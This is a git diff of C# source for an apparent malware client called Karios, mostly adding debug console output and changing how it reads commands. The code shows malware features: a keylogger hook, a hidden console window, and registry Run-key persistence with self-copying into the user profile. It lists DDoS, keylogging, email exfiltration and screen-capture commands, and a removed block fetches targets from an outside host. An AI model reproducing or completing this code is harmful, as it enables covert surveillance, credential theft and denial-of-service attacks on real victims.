@@ -31,26 +31,49 @@ namespace Karios
 
         public static void Main()
         {
+            //var handle = GetConsoleWindow();
+            //ShowWindow(handle, SW_HIDE);
+            //_hookID = SetHook(_proc);
+            Console.WriteLine("Starting commandget");
+            Console.ReadKey();
             CommandGet();
+            Console.WriteLine("Finished commandget");
+            Console.ReadKey();
+            if (Online == true)
+            {
+                Console.WriteLine("Online does equal true");
+                Console.ReadKey();
 
-            var handle = GetConsoleWindow();
+                // Persitance feature
+                // Duplicate(); 
+                // Run on startup 
+                // SetStartup();
+                // Start Application
 
-            // Hide the window
-            ShowWindow(handle, SW_HIDE);
-
-             // Persitance feature
-             // Duplicate(); 
-
-             // Run on startup 
-             // SetStartup();
-             // Start Application
-             _hookID = SetHook(_proc);
-             Application.Run();  
-             UnhookWindowsHookEx(_hookID);
-     
-            
+                RunApplication();
+                //UnhookWindowsHookEx(_hookID);
+            }
+            Console.WriteLine("IF Statement did not work... exiting");
+            Console.ReadKey();
         }
 
+        public static void RunApplication()
+        {
+           
+
+            // Hide the window
+            
+
+            // Persitance feature
+            // Duplicate(); 
+
+            // Run on startup 
+            // SetStartup();
+            // Start Application
+            
+            Application.Run();
+            //UnhookWindowsHookEx(_hookID);
+        }
 
         private static void CommandGet()
         {
@@ -67,7 +90,7 @@ namespace Karios
                 int GetIterations = -1;
                 string target = "";
                 bool Loop = true; // So we can break the loop
-                while (Loop)
+                while (Loop == true)
                 {
                     if (GetIterations == -1 || (target != "" && GetIterations > 9) || target == "")
                     {
@@ -118,13 +141,21 @@ namespace Karios
                         /// 2 = DDOSIP
                         /// 3 = KeyloggerOnline
                         /// 4 = Keylogger email
-                        /// 5 = Reverse everything
+                        /// 5 = Capture screen
+                        /// 6 = Startup
+                        /// 7  = Duplication
+                        /// 8 = Reverse everything
                         /// </summary>
-                        if (PreppedCommand[0] == "Online")
+
+                        if (PreppedCommand[0] == "Online=True")
                         {
-
+                            Online = true;
                         }
-
+                        else
+                        {
+                            //Online = false;
+                        }
+                        Loop = false;
                     }
                 }
             }
@@ -216,9 +247,10 @@ namespace Karios
         /// </summary>
         /// 
 
-        /*
+        
         public static void SetStartup()
         {
+            /*
             RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
             string pathToSecCopy = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\" + AppDomain.CurrentDomain.FriendlyName;
             string pathToApp = Application.ExecutablePath;
@@ -226,19 +258,20 @@ namespace Karios
             {
                 rkApp.SetValue(System.AppDomain.CurrentDomain.FriendlyName, pathToSecCopy);
             }
-
+            */
         }
 
         public static void Duplicate()
         {
+            /*
             if (Application.StartupPath != Environment.GetFolderPath(Environment.SpecialFolder.UserProfile))
             {
                 System.IO.File.Copy(Application.StartupPath + @"\" + System.AppDomain.CurrentDomain.FriendlyName
                                 , Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\" + AppDomain.CurrentDomain.FriendlyName, true);
             }
-
+            */
         }
-        */
+        
 
         public static string GetLocalIP(string LocalIP)
         {
@@ -264,16 +297,7 @@ namespace Karios
             {
                 try
                 {
-                    string webData = wc.DownloadString("http://cutenesss.xyz/SteamerTest.html");
-                    if (!webData.ToUpperInvariant().Contains("Website:"))
-                    {   
-                        //this is broken (The search gets everything next to the Website:)
-                        string search = "qwertyuiopasdfghjklzxcvbnmqwe";
-                        string Website = webData.Substring(webData.IndexOf(search) + search.Length);
-                        Website = Website.Replace(@"</p>", "");
-                        // IPTarget = IP on cutenesss.xyz/SteamerTest.html
-                        //Process.Start(Website);
-                    }
+     
                 }
                 catch { }
             }
